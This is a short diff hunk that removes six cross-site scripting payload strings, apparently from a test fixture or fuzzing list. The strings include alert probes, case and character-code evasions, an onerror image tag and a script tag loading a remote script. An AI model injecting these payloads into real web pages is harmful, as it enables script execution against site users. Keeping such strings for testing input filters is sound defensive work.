@@ -1,6 +1,0 @@
-<script>alert(1)</script>
-<sCriPt>alert(1);</sCriPt>
-<script src=http://ha.ckers.org/xss.js></script>
-<script>alert(String.fromCharCode(88,83,83));</script>
-<IMG """><script>alert("XSS")</script>">
-<img src="blah.jpg" onerror="alert()"/>
